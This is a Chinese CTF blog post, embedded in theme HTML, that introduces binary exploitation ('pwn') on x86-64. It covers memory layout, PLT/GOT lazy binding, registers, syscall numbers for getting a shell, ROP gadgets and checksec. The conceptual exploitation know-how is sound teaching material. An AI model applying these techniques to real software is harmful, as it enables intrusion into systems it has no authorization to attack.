  volantis.scroll.handleScrollEvents()
  volantis.scroll.ele = null;
  // 触发页面滚动至目标元素位置
  volantis.scroll.to = (ele, option = {}) => {
    if (!ele) return;
    volantis.scroll.ele = ele;
    // 默认配置
    opt = {
      top: ele.getBoundingClientRect().top + document.documentElement.scrollTop,
      behavior: "smooth"
    }
    // 定义配置
    if ("top" in option) {
      opt.top = option.top
    }
    if ("behavior" in option) {
      opt.behavior = option.behavior
    }
    if ("addTop" in option) {
      opt.top += option.addTop
    }
    if (!("observerDic" in option)) {
      option.observerDic = 100
    }
    // 滚动
    window.scrollTo(opt);
    // 监视器
    // 监视并矫正元素滚动到指定位置
    // 用于处理 lazyload 引起的 cls 导致的定位失败问题
    // option.observer = false
    if (option.observer) {
      setTimeout(() => {
        if (volantis.scroll.ele != ele) {
          return
        }
        volantis.scroll.unengine.push(() => {
          let me = ele.getBoundingClientRect().top
          if (!(me >= -option.observerDic && me <= option.observerDic)) {
            volantis.scroll.to(ele, option)
          }
          volantis.scroll.unengine.remove("unengineObserver")
        }, "unengineObserver")
      }, 1000)
    }
  }
  /********************** Content Visibility ********************************/
  // 见 source/css/first.styl 如果遇到任何问题 删除 .post-story 即可
  // 一个元素被声明 content-visibility 属性后 如果元素不在 viewport 中 浏览器不会计算其后代元素样式和属性 从而节省 Style & Layout 耗时
  // content-visibility 的副作用: 锚点失效 等等(实验初期 暂不明确), 使用此方法清除样式
  volantis.cleanContentVisibility = () => {
    if (document.querySelector(".post-story")) {
      console.log("cleanContentVisibility");
      document.querySelectorAll(".post-story").forEach(e => {
        e.classList.remove("post-story")
      })
    }
  }
  /******************************************************************************/
  /******************************************************************************/
  /******************************************************************************/
  //图像加载出错时的处理
  function errorImgAvatar(img) {
    img.src = "https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/avatar/round/3442075.svg";
    img.onerror = null;
  }
  function errorImgCover(img) {
    img.src = "https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/cover/76b86c0226ffd.svg";
    img.onerror = null;
  }
  /******************************************************************************/
</script>

<script>
  window.pdata={}
  pdata.ispage=true;
  pdata.commentPath="";
  pdata.commentPlaceholder="";
  pdata.commentConfig={};
  volantis.GLOBAL_CONFIG ={
    root: '/en/',
    debug: "env",
    default: {"avatar":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/image/2659360.svg"},
    lastupdate: new Date(1771996874673),
    cdn: {
      izitoast_css: 'https://unpkg.com/izitoast@1.4.0/dist/css/iziToast.min.css',
      izitoast_js: 'https://unpkg.com/izitoast@1.4.0/dist/js/iziToast.min.js',
      fancybox_css: 'https://unpkg.com/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css',
      fancybox_js: 'https://unpkg.com/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js'
    },
    sidebar: {
      for_page: ["blogger","category","tagcloud","donate"],
      for_post: ["toc"],
      webinfo: {
        lastupd: {
          enable: true,
          friendlyShow: true
        },
        runtime: {
          data: "2020/01/01",
          unit: "天"
        }
      }
    },
    plugins: {
      message: {"enable":true,"icon":{"default":"fa-solid fa-info-circle light-blue","quection":"fa-solid fa-question-circle light-blue"},"time":{"default":5000,"quection":20000},"position":"topRight","transitionIn":"bounceInLeft","transitionOut":"fadeOutRight","titleColor":"var(--color-text)","messageColor":"var(--color-text)","backgroundColor":"var(--color-card)","zindex":2147483647,"copyright":{"enable":true,"title":"知识共享许可协议","message":"请遵守 CC BY-NC-SA 4.0 协议。","icon":"far fa-copyright light-blue"},"aplayer":{"enable":true,"play":"fa-solid fa-play","pause":"fa-solid fa-pause"},"rightmenu":{"enable":true,"notice":true}},
      
      
    },
    search: {
      

      
        dataPath: (("/en/" || "/").endsWith("/") ? "/en/" || "/" : "/en//" || "/") + "content.json",
      

      
    },
    languages: {
      
        search: {
          hits_empty: "We didn't find any results for the search: ${query}.",
          hits_stats: "${hits} results found in ${time} ms",
        }
      
    }
  }
</script>
  <!-- import head_end begin -->
  <!-- import head_end end -->
  <!-- Custom Files headEnd begin-->
  
  <!-- Custom Files headEnd end-->
</head>
  <body itemscope itemtype="https://schema.org.cn/WebPage">
    
    <header itemscope itemtype="https://schema.org.cn/WPHeader" id="l_header" class="l_header auto shadow floatable blur " style='opacity: 0' >
  <div class='container'>
  <div id='wrapper'>
    <div class='nav-sub'>
      <p class="title"></p>
      <ul class='switcher nav-list-h m-phone'>
        <li><a id="s-comment" class="fa-solid fa-comments fa-fw" target="_self" title="comment"></a></li>
        
          <li><a id="s-toc" class="s-toc fa-solid fa-list fa-fw" target="_self" title="toc"></a></li>
        
      </ul>
    </div>
		<div class="nav-main">
      
        
        <a class="title flat-box" target="_self" href='/en/'>
          
            <img no-lazy class='logo' src='https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/Logo-NavBar@3x.png'/>
          
          
          
        </a>
      

			<div class='menu navigation'>
				<ul class='nav-list-h m-pc'>
          
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/" title="Blog"
                  
                  
                  
                    active-action="action-en"
                  >
                  <i class='fa-solid fa-rss fa-fw'></i>Blog
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/categories/" title="Categories"
                  
                  
                  
                    active-action="action-encategories"
                  >
                  <i class='fa-solid fa-folder-open fa-fw'></i>Categories
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/tags/" title="Tags"
                  
                  
                  
                    active-action="action-entags"
                  >
                  <i class='fa-solid fa-tags fa-fw'></i>Tags
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/archives/" title="Archievs"
                  
                  
                  
                    active-action="action-enarchives"
                  >
                  <i class='fa-solid fa-archive fa-fw'></i>Archievs
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/friends/" title="Friends"
                  
                  
                  
                    active-action="action-enfriends"
                  >
                  <i class='fa-solid fa-link fa-fw'></i>Friends
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/about/" title="About"
                  
                  
                  
                    active-action="action-enabout"
                  >
                  <i class='fa-solid fa-info-circle fa-fw'></i>About
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box header toggle-mode-btn">
                  <i class='fa-solid fa-moon fa-fw'></i>Dark
                </a>
              <li>
            
          
          
				</ul>
			</div>
      
      <div class="m_search">
        <form name="searchform" class="form u-search-form">
          <i class="icon fa-solid fa-search fa-fw"></i>
          <input type="text" class="input u-search-input" placeholder="Search..." />
        </form>
      </div>
      

			<ul class='switcher nav-list-h m-phone'>
				
					<li><a class="s-search fa-solid fa-search fa-fw" target="_self" title="search"></a></li>
				
				<li>
          <a class="s-menu fa-solid fa-bars fa-fw" target="_self" title="menu"></a>
          <ul class="menu-phone list-v navigation white-box">
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/" title="Blog"
                  
                  
                  
                    active-action="action-en"
                  >
                  <i class='fa-solid fa-rss fa-fw'></i>Blog
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/categories/" title="Categories"
                  
                  
                  
                    active-action="action-encategories"
                  >
                  <i class='fa-solid fa-folder-open fa-fw'></i>Categories
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/tags/" title="Tags"
                  
                  
                  
                    active-action="action-entags"
                  >
                  <i class='fa-solid fa-tags fa-fw'></i>Tags
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/archives/" title="Archievs"
                  
                  
                  
                    active-action="action-enarchives"
                  >
                  <i class='fa-solid fa-archive fa-fw'></i>Archievs
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/friends/" title="Friends"
                  
                  
                  
                    active-action="action-enfriends"
                  >
                  <i class='fa-solid fa-link fa-fw'></i>Friends
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/en/about/" title="About"
                  
                  
                  
                    active-action="action-enabout"
                  >
                  <i class='fa-solid fa-info-circle fa-fw'></i>About
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box header toggle-mode-btn">
                  <i class='fa-solid fa-moon fa-fw'></i>Dark
                </a>
              <li>
            
          
            
          </ul>
        </li>
			</ul>

      <!-- Custom Files header begin -->
      
      <!-- Custom Files header end -->
		</div>
	</div>
  </div>
</header>

    <div id="l_body">
      <div id="l_cover">
  
    
      <div class="cover-wrapper post dock" id='half'>
        
  <div id="parallax-window"></div>

<div class='cover-body'>
  <div class='top'>
    
    
      <p class="title">Archer's blog</p>
    
    
  </div>
  <div class='bottom'>
    <div class='menu navigation'>
      <div class='list-h'>
        
          
            <a href="/en/"
              
              
              active-action="action-en">
              <i class='fa-solid fa-rss fa-fw'></i><p>Blog</p>
            </a>
          
            <a href="/en/categories/"
              
              
              active-action="action-encategories">
              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f5c3.svg'><p>Categories</p>
            </a>
          
            <a href="/en/tags/"
              
              
              active-action="action-entags">
              <i class='fa-solid fa-tags fa-fw'></i><p>Tags</p>
            </a>
          
            <a href="/en/archives/"
              
              
              active-action="action-enarchives">
              <i class='fa-solid fa-archive fa-fw'></i><p>Archievs</p>
            </a>
          
            <a href="/en/friends/"
              
              
              active-action="action-enfriends">
              <i class='fa-solid fa-link fa-fw'></i><p>Friends</p>
            </a>
          
            <a href="/en/about/"
              
              
              active-action="action-enabout">
              <i class='fa-solid fa-info-circle fa-fw'></i><p>About</p>
            </a>
          
        
      </div>
    </div>
  </div>
</div>

      </div>
    
  
</div>

      <div id="safearea">
        <div class="body-wrapper">
          
<div id="l_main" class=''>
  <article itemscope itemtype="https://schema.org.cn/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
  <link itemprop="mainEntityOfPage" href="https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/Pwn入门/">
  <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
    <meta itemprop="name" content="Hexo">
  </span>
  <span hidden itemprop="post" itemscope itemtype="https://schema.org.cn/Post">
    <meta itemprop="name" content="Hexo">
    <meta itemprop="description" content="hi">
  </span>
  


  
    <span hidden>
      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
    </span>
  
  <div class="article-meta" id="top">
    
    
    
      <h1 class="title" itemprop="name headline">
        CTF Pwn 入门
      </h1>
      <div class='new-meta-box'>
        
          
            
  
  
  
  <div class='new-meta-item category'>
    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
    <a class="category-link" href="/en/categories/CTF/">CTF</a><span class="sep"></span><a class="category-link" href="/en/categories/CTF/Pwn/">Pwn</a>
    
      <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
        <a href="/en/categories/CTF/" itemprop="url"><span itemprop="name">CTF</span></a>
      </span>
    
      <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
        <a href="/en/categories/CTF/Pwn/" itemprop="url"><span itemprop="name">Pwn</span></a>
      </span>
    
  </div>
  



          
        
          
            
  
  
  
  <div class="new-meta-item meta-tags"><a class="tag" href="/en/tags/Pwn/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>Pwn</p></a></div>
  <span hidden itemprop="keywords">Pwn</span>
  


          
        
          
            <div class="new-meta-item date" itemprop="dateModified" datetime="2026-02-07T00:43:56+01:00">
  <a class='notlink'>
    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
    <p>Last UpdatedFeb 7, 2026</p>
  </a>
</div>

          
        
          
            


<div class="new-meta-item browse">
  <a class='notlink'>
    <p>
      <i class="fa-solid fa-eye fa-fw" aria-hidden="true"></i>
      
      <span id="busuanzi_page_pv">
        <i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i>
      </span>
        
      <span>次浏览</span>
    </p>
  </a>
</div>


          
        
        <!-- Custom Files topMeta begin-->
        
        <!-- Custom Files topMeta end-->
      </div>
    
  </div>


  <div id="layoutHelper-page-plugins"></div>
  <div id="post-body" itemprop="articleBody">
    <p><strong>本篇文章主要介绍x86-64架构的64位程序下的pwn漏洞以及利用思路。</strong></p>
<p>（很多背景知识，安全性检查以及介绍工具功能的内容可能一开始完全看不懂，但是可以不用太在意。先知道有这么个东西，在后面看到需要相关知识/命令的时候再回来看就好。）</p>
<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a><strong>背景知识</strong></h2><h3 id="地址空间（Address-space，Prozess-Adressraum）"><a href="#地址空间（Address-space，Prozess-Adressraum）" class="headerlink" title="地址空间（Address space，Prozess Adressraum）"></a><strong>地址空间（Address space，Prozess Adressraum）</strong></h3><p><strong>地址空间</strong>可以被看作是一个巨大的 <strong>一维字节数组</strong>，在程序运行时（与它潜在的大小相比），其中只有少数位置存有数据。由于地址空间占用非常稀疏，操作系统会将其划分为大小相等的 <strong>页（Pages）</strong>，其中只有被操作系统释放（映射）的页才可以被访问。</p>
<p>程序从硬盘被加载到低地址空间（对应的页由操作系统或程序加载器自动提供）。</p>
<p>用于执行的机器代码存放在 <strong>文本段（Text Segment）</strong> 中，静态初始化的变量和字符串常量存放在 <strong>数据段（Data Segment）</strong> 中。静态变量如果在程序开始时尚未被赋值，则会放在 <strong>BSS 段</strong> 中，并由操作系统填充为零字节。</p>
<p>程序所需的动态链接库也由这三类段组成，并由程序加载器加载到更高的内存地址。由于这些库所需的内存是通过 <strong>mmap 系统调用</strong> 向操作系统申请的，因此它们也被称为 <strong>MMap 段</strong>。</p>
<p>在程序初始化过程中，还会额外保留两个区域：</p>
<ul>
<li><strong>栈（Stack）</strong>：用于自动管理的变量。</li>
<li><strong>堆（Heap）</strong>：用于动态分配的变量。</li>
</ul>
<p>栈在每次函数调用时会扩展一个 <strong>栈帧（Stack Frame）</strong>。在栈帧的内存区域中存储有当前函数的局部变量，以及一些管理信息，例如 <strong>返回地址</strong>。返回地址记录了当前执行的函数是从哪一个程序地址被调用的。随着函数调用深度的增加，栈会从高地址向低地址方向增长。</p>
<p>当需要在函数执行完毕后变量仍然存在时，就必须使用<strong>堆</strong>来进行动态内存分配（因为栈上的变量会在函数返回时自动释放）。在这种情况下，程序可以通过<strong>libc 提供的分配器</strong>使用<strong>malloc</strong>函数向系统申请内存。如果可能，分配器会返回对程序启动时预留的堆区域的引用；如果堆空间不足，分配器会通过 <strong>mmap 系统调用</strong> 向操作系统请求一个新的 MMap 段，并返回对该段的引用。</p>
<p><img src="/images/image-20250818000141067.png" class="lazyload" data-srcset="/images/image-20250818000141067.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250818000141067"></p>
<p><br></p>
<p>C 标准库（libc）除了包含内存分配器之外，还提供了许多常用函数，以便简化与操作系统的交互。</p>
<p>代码（文本段）是静止的，但动态库（libc）的地址每次运行时可能都会变（ASLR），或者在程序写好时根本不知道它在哪里。那程序是如何找到<code>printf</code>或<code>system</code>的真实地址的呢？</p>
<p>这个时候就需要PLT和GOT了：</p>
<ul>
<li><strong>PLT (Procedure Linkage Table - 过程链接表)</strong>：<ul>
<li>存放在<strong>.plt 段</strong>（类似于文本段，是<strong>只读、可执行</strong>的代码）。</li>
<li>指向GOT（记录的函数的GOT地址）</li>
</ul>
</li>
<li><strong>GOT (Global Offset Table - 全局偏移表)</strong>：<ul>
<li>存放在<strong>.got.plt 段</strong>（属于数据段的一部分，是<strong>可读、可写</strong>的数据）。</li>
<li>初始时指向PLT，解析后指向libc</li>
</ul>
</li>
</ul>
<p>Linux 为了启动速度，默认不会一开始就把所有函数的地址都填好，而是真正用到的时候才去找实际地址。这个过程叫<strong>延迟绑定</strong>。</p>
<p>延迟绑定主要分为2种过程：</p>
<p><strong>过程一：首次调用（符号解析阶段）</strong></p>
<p>当程序第一次尝试调用共享库中的函数（如 <code>printf</code>）时，由于地址尚未解析，执行流程如下：</p>
<ol>
<li><strong>调用 PLT 存根 (Call PLT Stub)</strong> 程序 <code>.text</code> 段执行 <code>call printf@plt</code> 指令，将控制流转移至 <code>.plt</code> 段中对应的 <code>printf</code> 存根代码。</li>
<li><strong>间接跳转 (Indirect Jump)</strong> PLT 存根执行第一条指令 <code>jmp *printf@GOT</code>。这是一条间接跳转指令，目标地址从全局偏移表（<code>.got.plt</code>）的对应条目中读取。</li>
<li><strong>回落至 PLT (Fallthrough)</strong> 在初始化状态下，<code>.got.plt</code> 中存储的地址并非函数的真实地址，而是 <strong>PLT 存根中下一条指令的地址</strong>（即紧随上述 <code>jmp</code> 指令之后的地址）。因此，执行流并未跳转至外部，而是继续执行 PLT 存根中的剩余代码。</li>
<li><strong>准备重定位参数 (Prepare Relocation)</strong> PLT 存根将该符号在重定位表中的索引（Relocation Index）压入栈中，随后跳转至 PLT 的公共头部（PLT[0]）。</li>
<li><strong>调用动态链接器 (Invoke Dynamic Linker)</strong> PLT[0] 将链接映射结构（link_map）压入栈，并调用动态链接器的解析函数（通常为 <code>_dl_runtime_resolve</code>）。</li>
<li><strong>符号解析与地址回填 (Resolution &amp; Patching)</strong> <code>_dl_runtime_resolve</code> 遍历依赖库的导出符号表，查找 <code>printf</code> 的实际虚拟地址（例如 <code>0x7ffff7a0d123</code>）。找到后，它执行两个操作：<ul>
<li><strong>执行函数</strong>：调用目标函数。</li>
<li><strong>更新 GOT</strong>：将查找到的真实地址写入 <code>.got.plt</code> 中对应的条目，覆盖原有的回落地址。</li>
</ul>
</li>
</ol>
<p><strong>过程二：后续调用（直接执行阶段）</strong></p>
<p>当程序再次执行 <code>call printf@plt</code> 时，由于 GOT 表项已被更新，流程简化如下：</p>
<ol>
<li><strong>调用 PLT 存根 (Call PLT Stub)</strong> 程序再次执行 <code>call printf@plt</code>，跳转至 <code>.plt</code> 段。</li>
<li><strong>间接跳转至目标 (Direct Redirection)</strong> PLT 存根再次执行 <code>jmp *printf@GOT</code>。此时，系统从 <code>.got.plt</code> 中读取到的已是 <code>printf</code> 的真实地址（<code>0x7ffff7a0d123</code>）。</li>
<li><strong>控制流转移 (Control Transfer)</strong> CPU 直接跳转至共享库中的 <code>printf</code> 函数入口执行，不再触发动态链接器的解析过程。</li>
</ol>
<p><br></p>
<p><strong>更详细的地址空间结构图示：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">高地址 (High Address) (通常是 0x7fffffffffff)</span><br><span class="line">            |</span><br><span class="line">+---------------------------+</span><br><span class="line">|    Kernel Space           | (内核空间 - 用户态无法直接访问)</span><br><span class="line">+---------------------------+</span><br><span class="line">|    Command Line Args      | (argv pointers)</span><br><span class="line">|    Environment Vars       | (envp pointers)</span><br><span class="line">+---------------------------+ &lt;--- [Stack Base / 栈底]</span><br><span class="line">|                           |</span><br><span class="line">|          Stack            | (栈)</span><br><span class="line">|       (Grows Down)        | 用于局部变量、函数参数、返回地址</span><br><span class="line">|            |              |</span><br><span class="line">|            v              |</span><br><span class="line">+---------------------------+ &lt;--- [RSP / 栈顶]</span><br><span class="line">|                           |</span><br><span class="line">|        (Random Gap)       | (随机偏移，用于 ASLR)</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                           |</span><br><span class="line">|   Memory Mapping Segment  | &lt;--- [MMap 段]</span><br><span class="line">|   (Shared Libraries)      | 动态链接库 (libc.so, ld-linux.so)</span><br><span class="line">|                           | </span><br><span class="line">|   +-------------------+   |</span><br><span class="line">|   |   libc.so .text   |   |</span><br><span class="line">|   | (printf的真实位置)  |   |</span><br><span class="line">|   +-------------------+   |</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                           |</span><br><span class="line">|       (Random Gap)        |</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+</span><br><span class="line">|            ^              |</span><br><span class="line">|            |              |</span><br><span class="line">|          Heap             | (堆)</span><br><span class="line">|       (Grows Up)          | 用于 malloc/new 分配的内存</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+ &lt;--- [Heap Base]</span><br><span class="line">|                           |</span><br><span class="line">|        .bss Segment       | (未初始化数据段)</span><br><span class="line">|  (Block Started by Symbol)| 全局变量 int global_var; (默认 0)</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                           |</span><br><span class="line">|       .data Segment       | (已初始化数据段)</span><br><span class="line">|                           | 全局变量 int flag = 1;</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                           |</span><br><span class="line">|      .got.plt Section     | &lt;--- [GOT 表] (Data Segment的一部分)</span><br><span class="line">|   (Global Offset Table)   |</span><br><span class="line">|                           |</span><br><span class="line">|                           |</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                           |</span><br><span class="line">|        .plt Section       | &lt;--- [PLT 表] (Text Segment的一部分)</span><br><span class="line">|  (Procedure Linkage Table)|</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                           |</span><br><span class="line">|       .text Segment       | &lt;--- [代码段] </span><br><span class="line">|      (Binary Code)        |</span><br><span class="line">|                           | main 函数在这里</span><br><span class="line">|                           |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                           |</span><br><span class="line">|       Read-Only Data      | (.rodata) 字符串常量，比如说&quot;Hello World&quot;</span><br><span class="line">+---------------------------+</span><br><span class="line">            |</span><br><span class="line">            | (0x00400000 左右，如果是 PIE 则随机)</span><br><span class="line">            |</span><br><span class="line">      低地址 (Low Address) (0x000000000000)</span><br></pre></td></tr></table></figure>
<p>如果开启了ASLR（下面会讲），那么Stack Base (栈基址)、MMap Base (映射区基址)、Heap Base (堆基址)在每次程序运行的时候都是随机的地址。</p>
<p><br></p>
<p>在程序执行过程中，如果访问了一个无效的地址（即未映射的页），操作系统会向程序发送一个 <strong>段错误（Segmentation Fault）</strong> 信号。如果程序没有对此进行处理，就会导致程序终止。</p>
<h3 id="X86汇编"><a href="#X86汇编" class="headerlink" title="X86汇编"></a><strong>X86汇编</strong></h3><p>因为汇编设计的内容太多了，这里没法全都讲，所以大家自己找点其他的资料学一学。</p>
<p>但是并不是说不懂汇编就完全没法做和理解pwn题，所以也可以边学pwn边学汇编，这样有实际例子的情况下也可用更好更高效地掌握汇编。</p>
<p><br></p>
<p>下面主要提一些比较重要的点：</p>
<p><strong>Linux x64(System V AMD64 ABI)传参顺序：</strong></p>
<ol>
<li><strong><code>RDI</code></strong> (第 1 参数)。</li>
<li><strong><code>RSI</code></strong> (第 2 参数)</li>
<li><strong><code>RDX</code></strong> (第 3 参数)</li>
<li><strong><code>RCX</code></strong> (第 4 参数)</li>
<li><strong><code>R8</code></strong> (第 5 参数)</li>
<li><strong><code>R9</code></strong> (第 6 参数)</li>
<li>后续的参数会被存在栈上</li>
</ol>
<p>其他的常用寄存器：</p>
<ul>
<li><strong>RIP (Instruction Pointer)</strong><ul>
<li>定义：指向<strong>下一条</strong>要执行的指令地址。</li>
<li>PWN意义：当函数执行<code>ret</code>时，CPU 会把那个地址弹给 RIP。</li>
</ul>
</li>
<li><strong>RSP (Stack Pointer)</strong><ul>
<li>定义：永远指向栈顶。</li>
<li>PWN意义：<code>push</code>和<code>pop</code>都会自动修改它。</li>
</ul>
</li>
<li><strong>RBP (Base Pointer)</strong><ul>
<li>定义：栈帧的基址（底）。</li>
<li>PWN意义：主要用于定位局部变量。配合<code>leave; ret</code>可以实现栈迁移。</li>
</ul>
</li>
<li><strong>RAX (Accumulator)</strong><ul>
<li>常规用途：算术运算结果、函数的返回值。</li>
<li>PWN核心用途 (Syscall)： 在做ret2Syscall/SROP（利用系统调用拿 shell）时，<code>RAX</code>决定了要呼叫内核做什么。<ul>
<li><code>RAX = 59</code> (<code>0x3b</code>) -&gt; 对应 <code>execve</code> 系统调用（运行程序）。</li>
<li><code>RAX = 0</code> -&gt; <code>read</code></li>
<li><code>RAX = 1</code> -&gt; <code>write</code></li>
<li><code>RAX = 15</code> -&gt; <code>rt_sigreturn</code></li>
</ul>
</li>
</ul>
</li>
<li>特殊段寄存器：<strong>FS (Segment Register)</strong><ul>
<li>PWN意义：在64位Linux下，Canary的值总是存在<code>fs:[0x28]</code>这个位置。</li>
</ul>
</li>
</ul>
<h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a><strong>Gadget</strong></h3><p><strong>Gadget</strong>是指由于<strong>代码复用攻击（Code Reuse Attack）</strong>需求，而在现有的可执行内存段（如 <code>.text</code> 段或共享库）中被分离出来的、<strong>以控制流转移指令（Control Transfer Instruction）结尾</strong>的一段机器指令序列。</p>
<p>最常见的形式是<strong>ROP Gadget</strong>（Return-Oriented Programming Gadget），其结尾指令严格为<strong><code>ret</code> (Return)</strong>。</p>
<p>一个标准的 Gadget 由两部分组成：</p>
<ol>
<li><strong>操作指令序列 (Operational Instructions)</strong>：执行实际的计算、数据传输或逻辑运算（如 <code>pop</code>, <code>mov</code>, <code>add</code>, <code>xor</code>）。</li>
<li><strong>终结指令 (Terminator)</strong>：用于将控制权交还给攻击者控制的机制。在 ROP 中，这是 <code>ret</code> 指令。</li>
</ol>
<p><strong>执行原语：</strong> Gadget 并不像正常函数那样通过 <code>call</code> 调用，而是通过<strong>栈指针（RSP/ESP）</strong>作为伪指令指针来驱动。</p>
<ul>
<li><strong><code>ret</code> 的本质</strong>：<code>pop rip</code>。它从栈顶弹出一个值赋给 RIP（指令指针）。</li>
<li>攻击者在栈上预先布置好一连串的地址（ROP Chain）。</li>
<li>每一个 Gadget 执行完其逻辑后，执行 <code>ret</code>，这会导致 CPU 从栈上读取<strong>下一个 Gadget 的地址</strong>并跳转执行。</li>
</ul>
<p>这种机制使得 <code>RSP</code> 实际上替代了 <code>RIP</code> 的角色，而栈上的数据流变成了指令流。</p>
<p><br></p>
<p>常用的gadget：</p>
<ul>
<li><code>pop rdi ; ret</code>、<code>pop rsi ; ret</code>、<code>pop rdx ; ret</code>：设置函数的参数</li>
<li><code>pop rbp</code>：把栈顶的8字节弹到寄存器 <code>rbp</code>，同时 <code>rsp += 8</code>。</li>
</ul>
<h2 id="安全性检查"><a href="#安全性检查" class="headerlink" title="安全性检查"></a><strong>安全性检查</strong></h2><p>我们可以使用<code>checksec</code>命令检查一份二进制文件的安全性.</p>
<p>安装：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install checksec</span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec ./vuln</span><br><span class="line"></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
